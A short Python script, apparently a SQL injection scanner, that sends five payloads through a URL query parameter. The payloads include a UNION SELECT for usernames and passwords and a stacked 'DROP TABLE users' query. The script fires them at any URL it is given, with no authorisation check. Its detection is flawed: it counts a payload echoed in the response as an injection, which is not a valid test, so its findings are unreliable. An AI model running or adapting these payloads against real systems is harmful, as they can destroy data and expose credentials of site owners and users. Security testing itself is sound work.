import requests

# Refined SQL Injection payloads
SQL_PAYLOADS = [
    {"name": "Single Quote Test", "payload": "' OR '1'='1"},
    {"name": "Union Select Test", "payload": "' UNION SELECT NULL, username, password FROM users--"},
    {"name": "Comment Injection", "payload": "' OR '1'='1'--"},
    {"name": "Double Query Test", "payload": "1'; DROP TABLE users--"},
    {"name": "Boolean-Based Test", "payload": "' AND 1=1--"}
]

def check_sql_injection(url):
    results = []
    for item in SQL_PAYLOADS:
        payload = item["payload"]
        test_url = f"{url}?test={payload}"
        try:
            response = requests.get(test_url)
            if payload in response.text:
                results.append({
                    "name": item["name"],
                    "url": test_url,
                    "payload": payload
                })
        except Exception as e:
            results.append({
                "name": "Error",
                "url": "",
                "payload": f"Error testing {test_url}: {str(e)}"
            })
    return results
